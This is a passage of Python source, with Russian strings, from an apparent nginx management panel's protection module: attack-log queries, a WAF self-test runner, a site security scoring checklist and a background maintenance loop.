            r = W.RULE_BY_ID.get(rule.split("/", 1)[1])
            return f"{W.CATEGORIES.get(r.cat, {}).get('title', r.cat)}: {r.title}" if r else rule
        if kind == "custom":
            rid = rule.split("/", 1)[-1]
            for cr in self.settings().custom_rules:
                if cr.id == rid:
                    return f"Своё правило: {cr.name}"
            return rule
        if kind == "threat":
            fid = rule.split("/", 1)[-1].split(":")[0]
            for f in self.settings().threat_feeds:
                if f.id == fid:
                    return f"Список угроз: {f.name}"
            return rule
        if kind == "modsec":
            rid = rule.split("/", 1)[-1]
            grp = CRS_GROUPS.get(rid[:3], ("", ""))[1]
            msg = self.modsec_titles.get(rid) or self._modsec_title_db(rid)
            return f"ModSecurity {rid}: {msg or grp or 'правило CRS'}"
        if kind == "fakebot":
            bid = rule.split("/", 1)[-1]
            for b in self.settings().verified_bots:
                if b.id == bid:
                    return f"Поддельный робот: {b.name}"
            return f"Поддельный робот: {bid}"
        if kind == "ratelimit":
            rid = rule.split("/", 1)[-1]
            for rr in self.settings().rate_rules:
                if rr.id == rid:
                    return f"Ограничение частоты: {rr.name}"
            return "Ограничение частоты сайта или входа" if rid in ("site", "") else f"Ограничение частоты: {rid}"
        return KINDS.get(kind, kind)

    def _modsec_title_db(self, rid: str) -> str:
        titles = self.db.kv_get("modsec_titles", {}) or {}
        return titles.get(rid, "")

    def events(self, limit: int = 200, before: Optional[float] = None, site: str = "", ip: str = "",
               kind: str = "", action: str = "", q: str = "", rid: str = "", test: Optional[bool] = False
               ) -> List[Dict[str, Any]]:
        cond, args = ["1=1"], []
        for col, v in (("site", site), ("ip", ip), ("kind", kind), ("action", action), ("rid", rid)):
            if v:
                cond.append(f"{col}=?")
                args.append(v)
        if before:
            cond.append("ts<?")
            args.append(before)
        if q:
            cond.append("(uri LIKE ? OR ua LIKE ? OR rule LIKE ? OR host LIKE ?)")
            args += [f"%{q}%"] * 4
        if test is not None:
            cond.append("test=?")
            args.append(1 if test else 0)
        rows = self.db.query(f"SELECT * FROM attack_log WHERE {' AND '.join(cond)} ORDER BY ts DESC LIMIT ?",
                             args + [min(limit, 2000)])
        for r in rows:
            r["title"] = self.rule_title(r["kind"], r["rule"])
        return rows

    # ------------------------------------------------------------------ самопроверка
    async def selftest(self, sid: int) -> Dict[str, Any]:
        state = self.app.nginx.load_state()
        site = dict(state.sites).get(sid)
        if site is None:
            raise ValueError("Сайт не найден")
        if not site.enabled:
            raise ValueError("Сайт выключен — его нет в конфигурации nginx")
        if self.app.pending().get("pending"):
            note = "Есть неприменённые изменения: проверяется работающая конфигурация nginx."
        else:
            note = ""
        tls = bool(site.ssl.enabled and site.ssl.certificate_id)
        port = site.https_port if tls else site.http_port
        host = site.listen_ip.strip("[]") if site.listen_ip else "127.0.0.1"
        domain = site.main_domain if hasattr(site, "main_domain") else site.domains[0]
        if domain.startswith("*.") or domain.startswith("~"):
            domain = "selftest" + domain[1:] if domain.startswith("*.") else site.domains[0]
        p = self.settings()
        modes = site_modes(p, site.protection)
        token = os.urandom(4).hex()
        cases = selftest_cases(p.waf_level)
        results = []
        # пропуск проверки браузера для самих запросов самопроверки: в режиме «Под атакой» иначе всё получило бы
        # страницу проверки, и самопроверка проверяла бы её, а не фильтр (адрес источника — адрес подключения)
        from .challenge import pass_token
        exp = int(time.time()) + 900
        pass_cookie = f"nm_pass={pass_token(self.app.nginx.challenge_secret(), exp, host if p.challenge_bind_ip else '')}; " \
                      f"nm_pass_e={exp}"

        def run(case, n):
            # пробелы, кавычки и # недопустимы в строке запроса HTTP — их кодирует любой клиент, кодируем и мы
            path = case["path"].replace(" ", "%20").replace('"', "%22").replace("#", "%23")
            sep = "&" if "?" in path else "?"
            target = f"{path}{sep}nm_selftest={token}{n}"
            hdrs = dict(case["headers"])
            hdrs.setdefault("User-Agent", "Mozilla/5.0 (NginxManager-SelfTest)")
            if "Cookie" not in hdrs:
                hdrs["Cookie"] = pass_cookie
            else:
                hdrs["Cookie"] += "; " + pass_cookie
            t0 = time.time()
            try:
                st, h = raw_request(host, port, tls, domain, case["method"], target, hdrs,
                                    body=case.get("body", "").encode())
                err = ""
            except OSError as e:
                st, h, err = None, {}, str(e)
            return st, h, err, round((time.time() - t0) * 1000)

        for n, case in enumerate(cases):
            st, h, err, ms = await asyncio.to_thread(run, case, n)
            disabled = case["rule"] in site.protection.waf_disabled_rules or case["rule"] in p.waf_disabled_rules
            mode = "off" if disabled else modes.get(case["cat"], "off")
            # 400 и 405 — запрос отклонил сам nginx (путь выше корня после нормализации, метод TRACE и т. п.)
            blocked = st in (400, 403, 405, 444) or (st is None and not err)
            results.append({**{k: case[k] for k in ("rule", "cat", "title", "method", "field")},
                            "payload": case["payload"][:160], "mode": mode, "status": st, "blocked": blocked,
                            "error": err, "ms": ms, "n": n})
        from .nginx import ProtectionConf
        msmode = ProtectionConf(state, self.app.nginx.paths(str(settings.live_dir)), self.app.nginx.caps()) \
            .modsec_site(site)
        if msmode != "off":
            for n, (title, ctype, body) in enumerate(MODSEC_CASES):
                case = {"path": "/", "headers": {"Content-Type": ctype}, "method": "POST", "body": body}
                st, h, err, ms = await asyncio.to_thread(run, case, 500 + n)
                results.append({"rule": "modsec", "cat": "modsec", "title": f"Тело запроса: {title}", "method": "POST",
                                "field": "тело запроса", "payload": body[:160], "mode": msmode, "status": st,
                                "blocked": st in (400, 403, 405, 444) or (st is None and not err), "error": err,
                                "ms": ms, "n": 500 + n})
        benign = []
        for n, path in enumerate(BENIGN_CASES):
            case = {"path": path, "headers": {}, "method": "GET"}
            st, h, err, ms = await asyncio.to_thread(run, case, 1000 + n)
            benign.append({"path": path, "status": st, "blocked": st in (403, 444) or st is None, "error": err})
        # «запись в журнал» видна только в журнале атак: ждём, пока сборщик дочитает журнал nginx
        await asyncio.sleep(3)
        if msmode != "off":
            await asyncio.to_thread(self.modsec_tick)
        self.flush()
        logged = {r["uri"] for r in self.db.query("SELECT uri FROM attack_log WHERE test=1 AND uri LIKE ?",
                                                  (f"%nm_selftest={token}%",))}
        for r in results:
            mark = f"nm_selftest={token}{r['n']}"
            r["logged"] = any(u.endswith(mark) or (mark + "&") in u for u in logged)
            if r["mode"] == "block":
                r["ok"] = r["blocked"]
            elif r["mode"] == "detect":
                r["ok"] = r["logged"] and not r["blocked"]
            else:
                r["ok"] = True
        summary = {
            "total": len(results), "block_expected": sum(r["mode"] == "block" for r in results),
            "blocked": sum(r["mode"] == "block" and r["blocked"] for r in results),
            "detect_expected": sum(r["mode"] == "detect" for r in results),
            "detected": sum(r["mode"] == "detect" and r["logged"] for r in results),
            "off": sum(r["mode"] == "off" for r in results),
            "failed": sum(not r["ok"] for r in results),
            "false_positives": sum(b["blocked"] for b in benign),
        }
        res = {"site": sid, "name": site.name, "target": f"{'https' if tls else 'http'}://{domain}:{port}",
               "ts": time.time(), "summary": summary, "results": results, "benign": benign, "note": note}
        self.db.kv_set(f"selftest_{sid}", {k: v for k, v in res.items() if k != "results"} | {"failed": [
            r for r in results if not r["ok"]][:50]})
        return res

    # ------------------------------------------------------------------ оценка защищённости
    def score(self, sid: int, site: Site) -> Dict[str, Any]:
        p = self.settings()
        g = self.app.global_settings()
        panel = self.app.panel()
        sp = site.protection
        modes = site_modes(p, sp)
        sec = site.security
        https = site.ssl.enabled
        core = ("sqli", "xss", "traversal", "rce", "php", "java", "files", "scanners", "cve", "webshells")
        blocked_core = sum(modes.get(c) == "block" for c in core)
        detect_core = sum(modes.get(c) == "detect" for c in core)
        caps = self.app.nginx.caps()
        from .nginx import ProtectionConf
        msmode = ProtectionConf(self.app.nginx.load_state(), self.app.nginx.paths(str(settings.live_dir)), caps) \
            .modsec_site(site)
        checks = [
            ("https", "Сайт работает по HTTPS", 10, https, "ssl", "Подключите сертификат на вкладке «SSL / HTTPS»"),
            ("redirect", "HTTP перенаправляется на HTTPS", 4, https and site.ssl.force_https, "ssl",
             "Включите «Перенаправлять HTTP на HTTPS»"),
            ("hsts", "HSTS (браузер не откроет сайт по HTTP)", 4, https and site.ssl.hsts, "ssl", "Включите HSTS"),
            ("tls", "Только TLS 1.2 и 1.3", 4, https and "TLSv1 " not in (site.ssl.protocols or g.ssl_protocols) + " "
             and "TLSv1.1" not in (site.ssl.protocols or g.ssl_protocols), "ssl", "Уберите TLSv1 и TLSv1.1"),
            ("waf", "Фильтр запросов блокирует основные атаки", 15, blocked_core >= 8, "protection",
             "Включите режим «Как в общих настройках» и блокировку категорий в «Защита → Фильтр запросов»"
             if detect_core < 8 else "Фильтр в режиме записи — переведите в блокировку после проверки журнала"),
            ("waf_detect", "Фильтр запросов хотя бы записывает атаки", 5, blocked_core + detect_core >= 8,
             "protection", "Включите фильтр запросов"),
            ("challenge", "Проверка браузера доступна для «Под атакой»", 5,
             sp.enabled and sp.challenge != "off" and challenge_ready(caps), "protection",
             "Режим «В режиме «Под атакой»» на вкладке «Защита от атак» (нужен модуль secure_link в nginx)"),
            ("rate", "Ограничение частоты запросов с IP", 8, sec.rate_limit, "security",
             "Включите ограничение частоты на вкладке «Безопасность»"),
            ("conn", "Ограничение соединений с IP", 4, sec.conn_limit > 0, "security",
             "Задайте «Макс. соединений с одного IP» (например, 50)"),
            ("login", "Защита форм входа от перебора", 4, sp.enabled and sp.login_protection, "protection",
             "Включите защиту форм входа, если на сайте есть вход"),
            ("headers", "Заголовки безопасности", 5, sec.security_headers, "security", "Включите заголовки безопасности"),
            ("csp", "Content-Security-Policy", 3, sec.security_headers and bool(sec.csp) and not sec.csp_report_only,
             "security", "Задайте CSP (сначала в режиме Report-Only)"),
            ("hidden", "Скрытые файлы (.git, .env) закрыты", 4, sec.block_hidden_files, "security",
             "Включите блокировку скрытых файлов"),
            ("strip", "Опасные заголовки запроса удаляются", 3, sp.enabled and sp.strip_headers or site.type != "proxy",
             "protection", "Включите «Удалять опасные заголовки запроса»"),
            ("sni", "Host и SNI сверяются", 2, not https or sp.enabled and sp.sni_check, "protection",
             "Включите проверку соответствия Host и SNI"),
            ("threats", "Подключены списки угроз", 4, sp.enabled and sp.threats and any(
                f.enabled for f in p.threat_feeds), "protection",
             "Подключите Spamhaus DROP и FireHOL level 1 в «Защита → Списки угроз»"),
            ("autoban", "Автоблокировка нарушителей", 5, panel.autoban_enabled, "panel-bans",
             "Включите автоблокировку в «Настройки панели → Блокировки IP»"),
            ("honeypot", "Ловушки для сканеров", 2, sp.enabled and sp.honeypot and bool(p.honeypot_paths),
             "protection", "Включите ловушки"),
            ("tokens", "Версия nginx скрыта (server_tokens off)", 3, not g.server_tokens, "global",
             "«Настройки nginx» → server_tokens: выключить"),
            ("slow", "Таймауты против медленных атак (Slowloris)", 3, _dur(g.client_header_timeout) <= 20
             and _dur(g.client_body_timeout) <= 30, "global",
             "client_header_timeout ≤ 15s, client_body_timeout ≤ 30s в «Настройки nginx»"),
            ("body", "Ограничен размер тела запроса", 2, bool(site.performance.client_max_body_size
                                                              or g.client_max_body_size), "performance",
             "Задайте client_max_body_size"),
            ("modsec", "Проверяется тело запроса (ModSecurity + OWASP CRS)", 6, msmode == "block", "protection",
             "Установите libnginx-mod-http-modsecurity и modsecurity-crs и включите «Глубокую проверку» в режиме "
             "блокировки" if msmode == "off" else "Глубокая проверка в режиме записи — переведите в блокировку"),
            ("fakebot", "Поддельные поисковые роботы отсекаются", 2, p.fake_bot_action in ("block", "challenge")
             and any(b.enabled for b in p.verified_bots), "protection", "«Защита → Роботы»: блокировать поддельных"),
        ]
        total = sum(w for _, _, w, *_ in checks)
        got = sum(w for _, _, w, ok, *_ in checks if ok)
        pct = round(got * 100 / total) if total else 0
        grade = "A" if pct >= 90 else "B" if pct >= 80 else "C" if pct >= 65 else "D" if pct >= 50 else "F"
        return {"site": sid, "name": site.name, "score": pct, "grade": grade,
                "checks": [{"id": i, "title": t, "weight": w, "ok": bool(ok), "tab": tab, "hint": hint}
                           for i, t, w, ok, tab, hint in checks]}

    # ------------------------------------------------------------------ фоновые задачи
    async def run(self) -> None:
        last_min = last_feeds = last_clean = 0.0
        while True:
            try:
                await asyncio.sleep(5)
                if self.settings().modsec_enabled:
                    await asyncio.to_thread(self.modsec_tick)
                await asyncio.to_thread(self.flush)
                now = time.time()
                if now - last_min >= 60:
                    last_min = now
                    await self.auto_attack_tick(now)
                if now - last_feeds >= 600:
                    last_feeds = now
                    ps = self.settings()
                    if any(f.enabled for f in ps.threat_feeds) or (
                            any(b.enabled for b in ps.verified_bots)
                            and (ps.fake_bot_action != "off" or ps.verified_skip_challenge)):
                        await self.update_feeds()
                if now - last_clean >= 3600:
                    last_clean = now
                    await asyncio.to_thread(self.cleanup)
            except asyncio.CancelledError:
                raise
            except Exception:  # noqa: BLE001 — фоновая задача не должна останавливаться
                log.exception("защита: ошибка фоновой задачи")


def _dur(v: str) -> float:
    v = (v or "").strip()
    m = re.match(r"^(\d+)(ms|s|m|h)?$", v)
    if not m:
        return 60.0
    n = int(m.group(1))
    return {"ms": n / 1000, "s": n, None: n, "m": n * 60, "h": n * 3600}[m.group(2)]
